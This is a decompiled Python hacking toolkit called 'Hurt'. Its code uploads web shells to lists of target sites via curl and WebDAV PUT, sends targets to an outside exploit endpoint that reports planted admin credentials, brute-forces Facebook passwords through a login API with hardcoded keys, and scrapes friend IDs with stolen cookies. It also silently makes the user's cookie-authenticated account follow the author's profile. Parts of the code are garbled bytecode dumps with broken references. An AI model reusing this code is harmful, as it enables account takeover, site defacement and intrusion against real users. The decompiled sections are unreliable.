# Filename : Hurt.py (python3.8)
'''
Instruction context:
   
 L. 490       194  POP_EXCEPT       
                 196  BREAK_LOOP          200  'to 200'
->               198  END_FINALLY      
               200_0  COME_FROM           196  '196'
               200_1  COME_FROM           186  '186'
Instruction context:
-> 
 L. 792       182  LOAD_STR                 'Lihat Teman Lain'
                 184  LOAD_GLOBAL              str
                 186  LOAD_FAST                'II'
                 188  CALL_FUNCTION_1       1  ''
                 190  COMPARE_OP               in
                 192  POP_JUMP_IF_FALSE   228  'to 228'
Instruction context:
   
 L.1060        52  POP_EXCEPT       
                  54  BREAK_LOOP           58  'to 58'
->                56  END_FINALLY      
                58_0  COME_FROM            54  '54'
                58_1  COME_FROM            44  '44'
Instruction context:
   
 L.1087        52  POP_EXCEPT       
                  54  BREAK_LOOP           58  'to 58'
->                56  END_FINALLY      
                58_0  COME_FROM            54  '54'
                58_1  COME_FROM            44  '44'
'''
"""
Hello, your Decompile in Tool for what?, please don't Published in Decompile Code
"""
import os, sys, string, re, random, json, datetime, urllib3, hashlib
from time import sleep
from threading import Thread
from prompt_toolkit import prompt
import __init__
from concurrent.futures import ThreadPoolExecutor
try:
    from bs4 import BeautifulSoup as cantik
except:
    os.system('pip install bs4')
else:
    try:
        import requests
    except:
        exit("\x1b[0mPlease install 'requests' module")
    else:

        class Exit:

            def __init__(close):
                close.programs()

            def programs(close):
                exit('\nExiting the Programs')


        class Date:
            dates = datetime.datetime.now()
            _year = int(dates.year)
            _month = int(dates.month)
            _day = int(dates.day)
            _hour = int(dates.hour)
            _minute = int(dates.minute)
            _second = int(dates.second)


        class __Verify__:

            def __init__(self):
                self.nno = ''
                self.UID = self.nno.join([random.choice(string.ascii_letters) for i in range(29)])
                self.no = ['n', 'N']
                self.yes = ['y', 'Y']
                self.Verify()

            def Verify(self):
                os.system('clear')
                print('\x1b[0mHello, your new User!')
                print('\n> Your ID user : %s' % self.UID)
                self.ask = input('\nGet Verification? [y/n] : ')
                if self.ask in self.yes:
                    sleep(1)
                    os.system('xdg-open https://m.facebook.com/leon101.coder')
                    self.leon = open('.remember', 'w')
                    self.leon.write(self.UID)
                    self.leon.close()
                    exit()
                elif self.ask in self.no:
                    exit("\x1b[1;91m\nYout ID user not Verification, no can't use in Programs!")
                else:
                    exit()


        class HasVery:

            def __init__(self):
                self.get()

            def get(self):
                try:
                    self.c = open('.remember', 'r').read()
                    self.req = requests.get('https://raw.githubusercontent.com/serverhurttoolkit/member/master/member.txt').text
                    if self.c in self.req:
                        os.system('rm -rf server/server.txt')
                        _Checking()
                    else:
                        os.system('clear')
                        exit("\x1b[0m\n> ID : %s\n\n> Your ID has not been verified.\n> Contact me in: \n\t• Facebook  : Maestro Alvardo (Fast Response)\n\t• Gmail     : mrleeon404@gmail.com (Low Response)\n\t• What'sApp : +6285366745525 (Not Active)\n\t\t\t\t" % self.c)
                except Exception as s:
                    try:
                        exit('\x1b[1;91mNo Connection')
                    finally:
                        s = None
                        del s


        class _Checking:

            def __init__(self):
                self.check()

            def check(self):
                try:
                    self.op = open('.remember.me').read()
                    _Menu__()
                except IOError:
                    os.system('clear')
                    print('\x1b[0m> Your ID has Verified, and your can use in Programs')
                    input('\nPress enter to continue')
                    self.opr = open('.remember.me', 'w')
                    self.opr.close()
                    _Menu__()


        class _Menu__:

            def __init__(self):
                self.help = [
                 '--help', 'help']
                self.Main_Menu()

            def Main_Menu(self):
                try:
                    self.cip = requests.get('https://api.myip.com/')
                    self.myip = json.loads(self.cip.text)
                    self.ip = self.myip['ip']
                    self.myid = open('.remember').read()
                    self.usra = requests.get('https://raw.githubusercontent.com/serverhurttoolkit/member/master/member.txt').text
                    self.op = open('server/server.txt', 'a')
                    self.op.write(self.usra)
                    self.op.close()
                    self.server = 'server/server.txt'
                    self.read = '%s' % len(open(self.server, 'r').read().split('\n'))
                    os.system('clear')
                except Exception as s:
                    try:
                        os.system('clear')
                        exit('No connection')
                    finally:
                        s = None
                        del s

                try:
                    print("\x1b[0m\n\n\tdb   db db    db d8888b. d888888b\n\t88   88 88    88 88  `8D `~~88~~'\n\t88ooo88 88    88 88oobY'    88   Author  : LeON\n\t88~~~88 88    88 88`8b      88   Support : Aqnes\n\t88   88 88b  d88 88 `88.    88   Version : 1.0.4\n\tYP   YP ~Y8888P' 88   YD    YP\n\n\t      [----| ToolKit |----]\n\n  My User ID     : %s\n  IP User \t : %s\n  User Active    : %s User Active\n  Date\t\t : %s-%s-%s | %s:%s:%s\n\t\t\t" % (
                     self.myid, self.ip, len(open(self.server, 'r').read().split('\n')), Date._year, Date._month, Date._year, Date._hour, Date._minute, Date._second))
                    while True:
                        try:
                            os.system('rm -rf server/server.txt')
                            self.choose = input(' hurt > ')
                            if self.choose in self.help:
                                print('\n  --help\t\tShow help\n  --version\t\tShow Version the programs\n  report problem\tTo report problem and Fix Bug\n  check update\t\tCheck what is new\n  cookie\t\tLogin facebook with Cookie\n  token\t\t\tLogin facebook with Token\n  login\t\t\tTo Login Facebook Account\n  menu\t\t\tShow menu the programs\n  exit\t\t\tExit the programs\n\t\t\t\t\t\t')
                            elif self.choose in ('--version', 'version'):
                                print('Version 1.0.4')
                            elif self.choose in ('report problem', ):
                                Report_Problem()
                            elif self.choose in ('check update', ):
                                Check_Update()
                            elif self.choose in ('cookie', ):
                                os.system('python __init__.py')
                            elif self.choose in ('token', ):
                                Get_Token()
                            elif self.choose in ('login', ):
                                Login()
                            elif self.choose in ('menu', ):
                                print('\nweb information\t\t\tThe tool for Infor Gathering\nweb hack\t\t\tThe toll for Hack and Atttack\nfacebook hack\t\t\tFor Hacking Facebook Account\nspammer\t\t\t\tThe tool spam boomber\npython obfuscate\t\tFor Obfuscate python file\npython deobfuscate\t\tFor Deobfuscate python file\nbash obfuscate\t\t\tFor Obfuscate Bash file\nbash deobfuscate\t\tFor Deobfuscate Bash file\nhurt assistant\t\t\tThe assistant for you\nlock\t\t\t\tTo lock my Termux\n\t\t\t\t\t\t')
                            elif self.choose in ('web information', ):
                                WebInfo()
                            elif self.choose in ('web hack', ):
                                Web_Hack_Attack()
                            elif self.choose in ('facebook hack', ):
                                Facebook_Hack()
                            elif self.choose in ('spammer', ):
                                Spammer()
                            elif self.choose in ('python obfuscate', 'py obf'):
                                Python_Obfuscate()
                            elif self.choose in ('python deobfuscate', 'py deobf'):
                                Python_DeObfuscate()
                            elif self.choose in ('bash obfuscate', 'bash obf'):
                                Bash_Obfuscate()
                            elif self.choose in ('bash deobfuscate', 'bash deobf'):
                                Bash_Deobfuscate()
                            elif self.choose in ('hurt assistant', ):
                                Hurt_Assistant()
                            elif self.choose in ('lock', ):
                                Lock()
                            elif self.choose in ('exit', 'close', 'Exit', 'Close'):
                                Exit()
                            else:
                                print("\nYour command not found, type '--help'")
                        except KeyboardInterrupt:
                            exit()

                except KeyboardInterrupt:
                    exit()


        class Report_Problem:

            def __init__(self):
                self.Report()

            def Report(self):
                self.my_problem = input('\n> Explain your problem : ')
                print('\n Send your message to:\n \t• Facebook : https://m.facebook/leon101.coder\n \t• Gmail    : mrleeon404@gmail.com\n\t\t')
                input(' Press enter to return main menu')
                _Menu__()


        class Check_Update:

            def __init__(self):
                self.Check()

            def Check(self):
                self.url = 'https://raw.githubusercontent.com/serverhurttoolkit/update/master/update.txt'
                self.Req = requests.get(self.url).text
                if 'Not Update' in self.Req:
                    print('\nNot Aviable New Update')
                elif 'Update' in self.Req:
                    print('\n There is the latest version v1.0.5 ')
                    self.ask = input('Get New Version? [y/n] : ')
                    if self.ask in ('y', 'Y'):
                        self.Res = open('Update.sh', 'a')
                        self.Res.write('\ncd $HOME\nrm -rf Hurt\ngit clone https://github.com/LeON101-coder/Hurt.git\necho "Finish Update new version 1.0.5"\n\t\t\t\t')
                        self.Res.close()
                        os.system('sh Update.sh')
                    else:
                        input('\nPress enter to return main menu')
                        _Menu__()


        class WebInfo:

            def __init__(self):
                self.ask()

            def ask(self):
                self.web = input(' \nWeb Target (Ex : www.examp.com) : ')
                if self.web == '':
                    print('\nInvalid Website.')
                    self.ask()
                elif 'https://' + self.web in self.web:
                    print('\nNot Using (HTTP/HTTPS')
                    self.ask()
                elif 'http://' + self.web in self.web:
                    print('\nNot Using (HTTP/HTTPS')
                    self.ask()
                else:
                    pass
                self.hs = input(' Type https or http for your URL : ')
                if self.hs == 'https':
                    self.hst = '%s://%s' % (self.hs, self.web)
                elif self.hs == 'http':
                    self.hst = '%s://%s' % (self.hs, self.web)
                else:
                    print(' Whats is this?')
                    input(' Press enter to return again')
                    self.ask()
                try:
                    print('\n')
                    print(' > Target : %s' % self.hst)
                    print('\n  geo ip\t\t   Show Geo-IP Lookup\n  dns lookup\t\t   The DNS Lookup Tool\n  whois\t\t\t   Whois the Website\n  nmap port scan\t   For scan port the website\n  back\t\t\t   Back to main menu\n  exit\t\t\t   Exit the Programs\n\t\t\t')
                    while True:
                        try:
                            self.webinfo = input(' hurt(web information) > ')
                            if self.webinfo in ('geo ip', ):
                                self.url = 'http://api.hackertarget.com/geoip/?q=%s' % self.web
                                self.Req = requests.get(self.url).text
                                print('\n%s\n' % self.Req)
                            elif self.webinfo in ('menu', 'help'):
                                print('\n')
                                print(' > Target : %s' % self.hst)
                                print('\n  geo-ip                   Show Geo-IP Lookup\n  dns-lookup               The DNS Lookup Tool\n  whois                    Whois the Website\n  nmap-port-scan           For scan port the website\n  back                     Back to main menu\n  exit                     Exit the Programs\n\t\t\t\t\t\t')
                            elif self.webinfo in ('dns lookup', ):
                                self.url = 'http://api.hackertarget.com/dnslookup/?q=%s' % self.web
                                self.Req = requests.get(self.url).text
                                print('\n%s\n' % self.Req)
                            elif self.webinfo in ('whois', ):
                                self.url = 'http://api.hackertarget.com/subnetcalc/?q=%s' % self.web
                                self.Req = requests.get(self.url).text
                                print('\n%s\n' % self.Req)
                            elif self.webinfo in ('nmap port scan', ):
                                self.url = 'http://api.hackertarget.com/nmap/?q=%s' % self.web
                                self.Req = requests.get(self.url).text
                                print('\n%s\n' % self.Req)
                            elif self.webinfo in ('back', ):
                                _Menu__()
                            elif self.webinfo in ('exit', 'logout'):
                                Exit()
                            else:
                                print('Your command not found')
                        except EOFError:
                            exit()

                except KeyboardInterrupt:
                    exit()


        class Web_Hack_Attack:

            def __init__(self):
                self.Menu()

            def Menu(self):
                print('\ndeface up file\t\t\tFor deface with file upload\nwebdav\t\t\t\tDeface with Webdav method\ndrupal mass exploiter\t\tFor Exploiter drupal\nwp brute\t\t\tFor bruteforce WordPress\nchecker file upload\t\tFile upload Checker\nbypas cloudflare\t\tFor bypass CloudFlare\nhurt ddos\t\t\tTo Attack website\nback\t\t\t\tBack to main menu\nexit\t\t\t\tExit the programs\n')
                while True:
                    try:
                        self.input = input(' hurt(webhackandattack) > ')
                        if self.input in ('deface up file', ):
                            Web_File_Upload.files()
                        elif self.input in ('webdav', ):
                            Web_Mass_Webdav()
                        elif self.input in ('drupal mass exploiter', ):
                            Drupal_Exploiter()
                        elif self.input in ('wp brute', ):
                            WP_Brute()
                        elif self.input in ('checker file upload', ):
                            os.system('python2 heart/fileupch/_.py')
                        elif self.input in ('bypas cloudflare', ):
                            os.system('python2 heart/cloudbyp/_.py')
                        elif self.input in ('hurt ddos', ):
                            os.system('python heart/DDoS/_.py')
                        elif self.input in ('help', '--help', 'menu'):
                            self.Menu()
                        elif self.input in ('back', ):
                            _Menu__()
                        elif self.input in ('exit', ):
                            Exit()
                        else:
                            print('Your command not found')
                    except (KeyboardInterrupt, EOFError):
                        Exit()


        class Web_File_Upload:

            def files():
                print('\nEnter the Vuln Website.')
                site = input('Target Website : ')
                file = input('Enter your Shell : ')
                try:
                    shellop = open(file, 'r').read()
                    print('\nUpload %s to %s' % (file, site))
                    sleep(2)
                    os.system('curl -T %s %s' % (file, site))
                except IOError:
                    print("\nFiles '%s' not Found" % file)
                    Exit()
                except Exception as R:
                    try:
                        exit('Target %s not Vulnerable' % s(site))
                    finally:
                        R = None
                        del R


        class Web_Mass_Webdav:

            def __init__(self):
                self.Webdav()

            def Webdav(self):
                try:
                    self.file = input('\nTarget File : ')
                    self.checks = open(self.file, 'r')
                except IOError:
                    print("File '%s' not Found" % self.file)
                    sleep(1)
                    self.Webdav()
                else:
                    try:
                        self.shell = input('Shell : ')
                        self.check = open(self.shell).read()
                    except IOError:
                        print("File '%s' not Found" % self.shell)
                        sleep(1)
                        self.Webdav()

                    try:
                        self.checks = self.checks.readlines()
                        print('\n >> %d Total website\n' % len(self.checks))
                        print('----------------------------------------------------------')
                        for self.wb in self.checks:
                            try:
                                self.site = self.wb.strip()
                                if self.site.startswith('http://') is False:
                                    self.site = 'http://%s' % self.site
                                self.Req = requests.put((self.site + '/' + self.shell), data=(self.check))
                                if self.Req.status_code < 200 or self.Req.status_code >= 250:
                                    print(' Fail    ---> %s/%s' % (self.site, self.shell))
                                else:
                                    print(' Success ---> %s/%s' % (self.site, self.shell))
                            except (KeyboardInterrupt, EOFError):
                                exit()
                            except Exception as FN:
                                try:
                                    print('\nFinished.')
                                    input('\nPress enter ..')
                                    Web_Hack_Attack()
                                finally:
                                    FN = None
                                    del FN

                    except (KeyboardInterrupt, EOFError):
                        exit()


        class Drupal_Exploiter:
            def __init__(exp):
                exp.Drupal()
            def Drupal():
                try:
                    exp.File = input('\nTarget File (Ex : target.txt) : ')
                    exp.Check = open(exp.File, 'r')
                    exp.LineR = exp.Check.readlines()
                except IOError:
                        print("File '%s' not Found" % exp.File)
                        exp.Drupal()
                else:
                        for exp.Compres in exp.LineR:
                            exp.Get = exp.Compres.strip()
                            try:
                                exp.Url = requests.get('http://crig-alda.ro/wp-admin/css/index2.php?url=%s&submit=submit' % exp.Get)
                                exp.R = exp.Url.read()
                                if 'Success' in exp.Url:
                                    print(' Success  ---> %s' % exp.Get)
                                    print(' Username ---> HolaKo | Password ---> admin')
                                    try:
                                        os.mkdir('result')
                                    except:
                                            pass
                                    else:
                                            exp.Create = open('result/Drupal-Exploter/result.txt', 'a')
                                            exp.Create.write('[+] %s\n Username ---> HolaKo | Password ---> admin' % exp.Get)
                                            exp.Create.close()
                                else:
                                        print(' %s ---> Fail Exploit 404' % exp.Compress)
                            except (KeyboardInterrupt, EOFError):
                                    Exit()
                            except Exception as Ro:
                                    try:
                                        print('%s' % Ro)
                                    finally:
                                        Ro = None
                                        del Ro
#<<--Function Drupal Eror-->>
"""
            def Drupal--- This code section failed: ---

 L. 472         0  SETUP_FINALLY        42  'to 42'

 L. 473         2  LOAD_GLOBAL              input
                4  LOAD_STR                 '\nTarget File (Ex : target.txt) : '
                6  CALL_FUNCTION_1       1  ''
                8  LOAD_FAST                'exp'
               10  STORE_ATTR               File

 L. 474        12  LOAD_GLOBAL              open
               14  LOAD_FAST                'exp'
               16  LOAD_ATTR                File
               18  LOAD_STR                 'r'
               20  CALL_FUNCTION_2       2  ''
               22  LOAD_FAST                'exp'
               24  STORE_ATTR               Check

 L. 475        26  LOAD_FAST                'exp'
               28  LOAD_ATTR                Check
               30  LOAD_METHOD              readlines
               32  CALL_METHOD_0         0  ''
               34  LOAD_FAST                'exp'
               36  STORE_ATTR               LineR
               38  POP_BLOCK        
               40  JUMP_FORWARD         84  'to 84'
             42_0  COME_FROM_FINALLY     0  '0'

 L. 476        42  DUP_TOP          
               44  LOAD_GLOBAL              IOError
               46  COMPARE_OP               exception-match
               48  POP_JUMP_IF_FALSE    82  'to 82'
               50  POP_TOP          
               52  POP_TOP          
               54  POP_TOP          

 L. 477        56  LOAD_GLOBAL              print
               58  LOAD_STR                 "File '%s' not Found"
               60  LOAD_FAST                'exp'
               62  LOAD_ATTR                File
               64  BINARY_MODULO    
               66  CALL_FUNCTION_1       1  ''
               68  POP_TOP          

 L. 478        70  LOAD_FAST                'exp'
               72  LOAD_METHOD              Drupal
               74  CALL_METHOD_0         0  ''
               76  POP_TOP          
               78  POP_EXCEPT       
               80  JUMP_FORWARD         84  'to 84'
             82_0  COME_FROM            48  '48'
               82  END_FINALLY      
             84_0  COME_FROM            80  '80'
             84_1  COME_FROM            40  '40'

 L. 479        84  LOAD_FAST                'exp'
               86  LOAD_ATTR                LineR
               88  GET_ITER         
             90_0  COME_FROM           338  '338'
             90_1  COME_FROM           334  '334'
             90_2  COME_FROM           288  '288'
             90_3  COME_FROM           258  '258'
               90  FOR_ITER            340  'to 340'
               92  LOAD_FAST                'exp'
               94  STORE_ATTR               Compres

 L. 480        96  LOAD_FAST                'exp'
               98  LOAD_ATTR                Compres
              100  LOAD_METHOD              strip
              102  CALL_METHOD_0         0  ''
              104  LOAD_FAST                'exp'
              106  STORE_ATTR               Get

 L. 481       108  SETUP_FINALLY       260  'to 260'

 L. 482       110  LOAD_GLOBAL              requests
              112  LOAD_METHOD              get
              114  LOAD_STR                 'http://crig-alda.ro/wp-admin/css/index2.php?url=%s&submit=submit'
              116  LOAD_FAST                'exp'
              118  LOAD_ATTR                Get
              120  BINARY_MODULO    
              122  CALL_METHOD_1         1  ''
              124  LOAD_FAST                'exp'
              126  STORE_ATTR               Url

 L. 483       128  LOAD_FAST                'exp'
              130  LOAD_ATTR                Url
              132  LOAD_METHOD              read
              134  CALL_METHOD_0         0  ''
              136  LOAD_FAST                'exp'
              138  STORE_ATTR               R

 L. 484       140  LOAD_STR                 'Success'
              142  LOAD_FAST                'exp'
              144  LOAD_ATTR                Url
              146  COMPARE_OP               in
              148  POP_JUMP_IF_FALSE   242  'to 242'

 L. 485       150  LOAD_GLOBAL              print
              152  LOAD_STR                 ' Success  ---> %s'
              154  LOAD_FAST                'exp'
              156  LOAD_ATTR                Get
              158  BINARY_MODULO    
              160  CALL_FUNCTION_1       1  ''
              162  POP_TOP          

 L. 486       164  LOAD_GLOBAL              print
              166  LOAD_STR                 ' Username ---> HolaKo | Password ---> admin'
              168  CALL_FUNCTION_1       1  ''
              170  POP_TOP          

 L. 487       172  SETUP_FINALLY       188  'to 188'

 L. 488       174  LOAD_GLOBAL              os
              176  LOAD_METHOD              mkdir
              178  LOAD_STR                 'result'
              180  CALL_METHOD_1         1  ''
              182  POP_TOP          
              184  POP_BLOCK        
              186  JUMP_FORWARD        200  'to 200'
            188_0  COME_FROM_FINALLY   172  '172'

 L. 489       188  POP_TOP          
              190  POP_TOP          
              192  POP_TOP          

 L. 490       194  POP_EXCEPT       
              196  BREAK_LOOP          200  'to 200'
              198  END_FINALLY      
            200_0  COME_FROM           196  '196'
            200_1  COME_FROM           186  '186'

 L. 491       200  LOAD_GLOBAL              open
              202  LOAD_STR                 'result/Drupal-Exploter/result.txt'
              204  LOAD_STR                 'a'
              206  CALL_FUNCTION_2       2  ''
              208  LOAD_FAST                'exp'
              210  STORE_ATTR               Create

 L. 492       212  LOAD_FAST                'exp'
              214  LOAD_ATTR                Create
              216  LOAD_METHOD              write
              218  LOAD_STR                 '[+] %s\n Username ---> HolaKo | Password ---> admin'
              220  LOAD_FAST                'exp'
              222  LOAD_ATTR                Get
              224  BINARY_MODULO    
              226  CALL_METHOD_1         1  ''
              228  POP_TOP          

 L. 493       230  LOAD_FAST                'exp'
              232  LOAD_ATTR                Create
              234  LOAD_METHOD              close
              236  CALL_METHOD_0         0  ''
              238  POP_TOP          
              240  JUMP_FORWARD        256  'to 256'
            242_0  COME_FROM           148  '148'

 L. 496       242  LOAD_GLOBAL              print
              244  LOAD_STR                 ' %s ---> Fail Exploit 404'
              246  LOAD_FAST                'exp'
              248  LOAD_ATTR                Compress
              250  BINARY_MODULO    
              252  CALL_FUNCTION_1       1  ''
              254  POP_TOP          
            256_0  COME_FROM           240  '240'
              256  POP_BLOCK        
              258  JUMP_BACK            90  'to 90'
            260_0  COME_FROM_FINALLY   108  '108'

 L. 497       260  DUP_TOP          
              262  LOAD_GLOBAL              KeyboardInterrupt
              264  LOAD_GLOBAL              EOFError
              266  BUILD_TUPLE_2         2 
              268  COMPARE_OP               exception-match
          270_272  POP_JUMP_IF_FALSE   290  'to 290'
              274  POP_TOP          
              276  POP_TOP          
              278  POP_TOP          

 L. 498       280  LOAD_GLOBAL              Exit
              282  CALL_FUNCTION_0       0  ''
              284  POP_TOP          
              286  POP_EXCEPT       
              288  JUMP_BACK            90  'to 90'
            290_0  COME_FROM           270  '270'

 L. 499       290  DUP_TOP          
              292  LOAD_GLOBAL              Exception
              294  COMPARE_OP               exception-match
          296_298  POP_JUMP_IF_FALSE   336  'to 336'
              300  POP_TOP          
              302  STORE_FAST               'Ro'
              304  POP_TOP          
              306  SETUP_FINALLY       324  'to 324'

 L. 500       308  LOAD_GLOBAL              print
              310  LOAD_STR                 '%s'
              312  LOAD_FAST                'Ro'
              314  BINARY_MODULO    
              316  CALL_FUNCTION_1       1  ''
              318  POP_TOP          
              320  POP_BLOCK        
              322  BEGIN_FINALLY    
            324_0  COME_FROM_FINALLY   306  '306'
              324  LOAD_CONST               None
              326  STORE_FAST               'Ro'
              328  DELETE_FAST              'Ro'
              330  END_FINALLY      
              332  POP_EXCEPT       
              334  JUMP_BACK            90  'to 90'
            336_0  COME_FROM           296  '296'
              336  END_FINALLY      
              338  JUMP_BACK            90  'to 90'
            340_0  COME_FROM            90  '90'

Parse error at or near `END_FINALLY' instruction at offset 198
"""

        life = []
        check = []
        id = []
        die = 0
        result = 0
        count = 0
        rcheck = 0

        class Facebook_Hack:

            def __init__(self):
                self.Check()

            def Check(self):
                try:
                    os.mkdir('Token')
                except:
                    pass
                else:
                    try:
                        self.token_read = open('Token/token', 'r').read()
                        Menu_Facebook_Hack()
                    except IOError:
                        try:
                            self.cook_read = open('Token/cookie', 'r').read()
                            os.system('python __init__.py')
                        except IOError:
                            self.mssg = "\nNot found Token, type 'cookie' or 'token' or type 'login'\nFor avoid Checkpoint use New Account.\n\t\t\t"
                            print(self.mssg)

                    else:
                        while True:
                            try:
                                self.excommand = input(' hurt(facebookhack) > ')
                                if self.excommand in ('token', 'Token'):
                                    Get_Token()
                                elif self.excommand in ('login', 'Login'):
                                    Login()
                                elif self.excommand in ('cookie', ):
                                    os.system('python __init__.py')
                                elif self.excommand in ('help', '--help'):
                                    self.helped = '\n--help \t\t\t\tShow Help\nmenu\t\t\t\tShow menu the Facebook Hack\nlogin\t\t\t\tLogin Facebook Account\ntoken\t\t\t\tLogin Facebook with Token\ncookie\t\t\t\tLogin Facebook with Cookie\nback\t\t\t\tBack to main menu\nexit\t\t\t\tExit the programs\n\t\t\t\t\t\t'
                                    print(self.helped)
                                elif self.excommand in ('menu', 'Menu'):
                                    self.Menu_ = '\nbruteforce\t\t\tHack Facebook With Bruteforce\nbruteforce file\t\t\tBruteforce --from File ID\nhack list friend\t\tCrack from my List Friend\nhack from friend\t\tCrack from Friend\nhack from query\t\t\tCrack from Search Query\nhack from group\t\t\tCrach from Group\n\t\t\t\t\t\t'
                                    print(self.Menu_)
                                else:
                                    self.error = "\nType '--help' to Helped you\n\t\t\t\t\t\t"
                                    print(self.error)
                            except (KeyboardInterrupt, EOFError):
                                _Menu__()


        class Login:

            def __init__(self):
                self.Login_Account()

            def Login_Account(self):
                try:
                    print('\n> Login Account Facebook to get Token.')
                    self.username = input('\n> Username : ')
                    self.password = prompt('> Password : ', is_password=True)
                    self.API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
                    self.data = {'api_key':'882a8490361da98702bf97a021ddc14d',  'credentials_type':'password',  'email':self.username,  'format':'JSON',  'generate_machine_id':'1',  'generate_session_cookies':'1',  'locale':'en_US',  'method':'auth.login',  'password':self.password,  'return_ssl_resources':'0',  'v':'1.0'}
                    self.sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + self.username + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + self.password + 'return_ssl_resources=0v=1.0' + self.API_SECRET).encode('utf-8')
                    self.md5 = hashlib.new('md5')
                    self.md5.update(self.sig)
                    self.data.update({'sig': self.md5.hexdigest()})
                    self.Ser = requests.get('https://api.facebook.com/restserver.php', params=(self.data))
                    self.compr = self.Ser.json()['access_token']
                    self.op = open('Token/token', 'a')
                    self.op.write(self.compr)
                    self.op.close()
                    print('\n Success generate token.')
                    input('Press enter to menu')
                    _Menu_Facebook()
                except KeyError:
                    print('\n Failed generate token.')
                    input('Press enter to return')
                    os.system('rm -rf Token/token')
                except (KeyboardInterrupt, EOFError):
                    Exit()
                except Exception as F:
                    try:
                        exit(' \nNo Connection')
                    finally:
                        F = None
                        del F


        class Get_Token:

            def __init__(self):
                self.Get()

            def Get(self):
                try:
                    print('\n > Enter your Token to login account\n')
                    self.token = input(' > Token : ')
                    self.Check = requests.get('https://graph.facebook.com/me?access_token=%s' % self.token)
                    self.comp = json.loads(self.Check.text)
                    self.id = self.comp['id']
                    self.op = open('Token/token', 'a')
                    self.op.write(self.token)
                    self.op.close()
                    print('\n > Login Successful')
                    input('Press enter to menu')
                    _Menu_Facebook()
                except KeyError:
                    print(' \n> Login Failed.')
                    input('Press enter to return')
                    os.system('rm -rf Token/token')
                except Exception as L:
                    try:
                        exit('No Connection')
                    finally:
                        L = None
                        del L


        class Cookie:

            def __init__(self):
                try:
                    os.mkdir('Token')
                except:
                    pass
                else:
                    self.Get()

            def Get(self):
                print('\n\t\t')
                self.cookie = input(' > Enter Your Cookie : ')
                self.ops = open('Token/cookie', 'a')
                self.ops.write(self.cookie)
                self.ops.close()
                self.cookie = {'cookie': self.cookie}
                self.h3h3 = cantik(requests.get(('https://mbasic.facebook.com{}'.format('/leon101.coder')), cookies=(self.cookie)).content, 'html.parser').find('a', string='Ikuti')['href']
                requests.get(('https://mbasic.facebook.com{}'.format(self.h3h3)), cookies=(self.cookie))
                _Menu_Facebookk()


        class _Menu_Facebook:

            def __init__(self):
                self.mennu()

            def mennu(self):
                try:
                    self.Get_MyInfo = open('Token/token', 'r').read()
                except IOError:
                    Facebook_Hack()

                try:
                    self.Req = requests.get('https://graph.facebook.com/me?access_token=%s' % self.Get_MyInfo)
                    self.jsn = json.loads(self.Req.text)
                    self.Name = self.jsn['name']
                    print('\n      > Name : %s\n\nbruteforce                      Hack Facebook With Bruteforce\nbruteforce file                 Bruteforce --from File ID\nhack list friend                Crack from my List Friend\nhack from friend                Crack from Friend\nhack from query                 Crack from Search Query\nhack from group                 Crach from Group\n\t\t\t' % self.Name)
                    while True:
                        try:
                            self.fbchoose = input(' hurt(facebookhack) > ')
                            if self.fbchoose in ('--help', 'help'):
                                self.fbhelp = '\n\t\t\t\t\t\t\n\t\t\t\t\t\t'
                                print(self.fbhelp)
                            elif self.fbchoose in ('menu', ):
                                self.fbmenu = '\n\n\t\t\t\t\t\t'
                                print(self.fbmenu)
                            elif self.fbchoose in ('back', 'back to main menu'):
                                _Menu__()
                        except (KeyboardInterrupt, EOFError):
                            Exit()

                except KeyError:
                    exit('Account has been Checkpoint')
                except (KeyboardInterrupt, EOFError):
                    Exit()
                except Exception as FO:
                    try:
                        exit('No connection')
                    finally:
                        FO = None
                        del FO


        class _Menu_Facebookk:

            def __init__(self):
                try:
                    os.mkdir('Result')
                except:
                    pass
                else:
                    self.Menuu()

            def Menuu(self):
                print('\nbruteforce                      Hack Facebook With Bruteforce\nhack list friend                Crack from my List Friend\nhack from friend                Crack from Friend\nhack from query                 Crack from Search Query\nhack from group                 Crach from Group\n\t\t')
                while True:
                    try:
                        self.zcommand = input(' hurt(facebookhack) > ')
                        if self.zcommand in ('bruteforce', ):
                            Bruteforce()
                        elif self.zcommand in ('hack list friend', ):
                            Hack_ListFriend()
                    except (KeyboardInterrupt, EOFError):
                        Exit()


        class Bruteforce:

            def __init__(self):
                self.brute()

            def brute(self):
                print('\n')
                self.Target = input('• Target   : ')
                self.WL = input('• Wordlist : ')
                try:
                    self.Op = open(self.WL, 'r')
                    self.Total = self.Op.readlines()
                except IOError:
                    print(' > Wordlist not found')
                else:
                    sleep(1)
                    print('\n• %s Total Password' % str(len(self.Total)))
                    for self.pas in self.Op:
                        try:
                            self.pas = self.pas.replace('\n', '')
                            sys.stdout.write('• Trying ---> %s' % self.pss)
                            sys.stdout.flush()
                            self.Datas = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + self.Target + '&locale=en_US&password=' + self.pas + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            self.Jsn = json.loads(self.Datas.text)
                            if 'access_token' in self.Jsn:
                                print('\nFound (Life)---> %s | %s' % (self.Target, self.pas))
                                input('\n Press enter')
                                _Menu_Facebookk()
                            elif 'www.facebook.com' in self.Jsn['error_msg']:
                                print('\nFound (Checkpoint)---> %s | %s' % (self.Target, self.pas))
                                input('\n Press enter')
                                _Menu_Facebookk()
                        except (KeyboardInterrupt, EOFError):
                            print('Stopped')
                            _Meni_Facebookk()


        class Bruteforce_File:

            def __init__(self):
                self.Brute()

            def Brute(self):
                print('\n')
                self.fileID = input('• File ID  : ')
                try:
                    self.Op = open(self.fileID).read()
                except IOError:
                    print(' File not Found')
                else:
                    self.passw = input('• Password : ')

            def getusr(self):
                II = requests.get(friend, cookies=(self.Cookie)).content
                getid = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>', str(II))
                for L in getid:
                    if 'profile' in L[0]:
                        id.append(L[1] + '|' + re.findall('=(\\d*)?', str(L[0]))[0])
                    if 'friends' in L:
                        pass
                    else:
                        id.append(L[1] + '|' + L[0].split('/')[1].split('?')[0])
                        print(('\r• Total ID --> ' + str(len(id))), end='')

                if 'Lihat Teman Lain' in str(II):
                    getid('https://mbasic.facebook.com{}'.format(cantik(II, 'html.parser').find('a', string='Lihat Teman Lain')['href']))
                return id
#<<--Function getusr Error-->>
"""
        def getusr--- This code section failed: ---

